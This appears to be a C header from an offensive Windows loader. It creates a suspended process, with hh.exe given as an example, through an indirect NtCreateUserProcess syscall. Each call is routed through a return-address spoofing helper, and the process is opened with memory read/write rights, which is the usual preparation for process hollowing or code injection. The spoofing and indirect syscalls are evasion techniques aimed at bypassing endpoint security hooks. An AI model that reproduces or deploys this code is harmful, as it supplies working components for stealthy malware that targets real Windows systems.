// This header file facilitates the creation of a suspended process using NtCreateUserProcess api

#pragma once
#include "functions.h"
#include "structs.h"
#include "retaddrspoof.h"

#define ZeroOut RtlSecureZeroMemory
#define PS_ATTRIBUTE_IMAGE_NAME PsAttributeValue(PsAttributeImageName, FALSE, TRUE, FALSE)
extern PVOID Gdgt;

/// <summary>
/// Creates a suspended process using NtCreateUserProcess api by invoking an indirect syscall, (szProcessName is in windows syntax: \\??\\C:\\Windows\\hh.exe)
/// </summary>
/// <param name="szProcessName"></param>
/// <param name="hCreatedProcess"></param>
/// <param name="hCreatedThread"></param>
/// <returns></returns>
NTSTATUS NtCreateUserSuspendedProcess(const wchar_t* szProcessName, PHANDLE hCreatedProcess, PHANDLE hCreatedThread) {

	UNICODE_STRING NtImagePath;
	ZeroOut(&NtImagePath, sizeof(UNICODE_STRING));
	RtlInitUnicodeString(&NtImagePath, szProcessName);

	// Create the process parameters
	PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;
	NTSTATUS status = (NTSTATUS)RetSpoofCall((void*)RtlCreateProcessParametersEx, 11, Gdgt,
		&ProcessParameters,
		&NtImagePath,
		NULL,
		NULL,
		&NtImagePath,  // CommandLine usually should be the same as ImagePath
		NULL,
		NULL,
		NULL,
		NULL,
		NULL,
		RTL_USER_PROCESS_PARAMETERS_NORMALIZED
	);



	// Initialize the PS_CREATE_INFO structure
	PS_CREATE_INFO CreateInfo = { 0 };
	ZeroMemory(&CreateInfo, sizeof(PS_CREATE_INFO));
	CreateInfo.Size = sizeof(CreateInfo);
	CreateInfo.State = PsCreateInitialState;

	// Initialize the PS_ATTRIBUTE_LIST structure
	size_t attributeListSize = sizeof(PS_ATTRIBUTE_LIST) + sizeof(PS_ATTRIBUTE);
	PS_ATTRIBUTE_LIST AttributeList = { 0 };
	ZeroMemory(&AttributeList, sizeof(AttributeList));


	AttributeList.TotalLength = attributeListSize - sizeof(PS_ATTRIBUTE);
	AttributeList.Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
	AttributeList.Attributes[0].Size = NtImagePath.Length;
	AttributeList.Attributes[0].Value = (ULONG_PTR)NtImagePath.Buffer;


	// Create the process
	HANDLE hProcess = NULL,
		hThread = NULL;


	status = (NTSTATUS)RetSpoofCall((void*)
		SysNtCreateUserProcess,
		11,
		Gdgt,
		&hProcess,
		&hThread,
		PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_TERMINATE,
		THREAD_SUSPEND_RESUME,
		NULL,
		NULL,
		0, // ProcessFlags
		THREAD_CREATE_FLAGS_CREATE_SUSPENDED, // ThreadFlags
		ProcessParameters,
		&CreateInfo,
		&AttributeList
	);

	*hCreatedProcess = hProcess;
	*hCreatedThread = hThread;


	return status;

}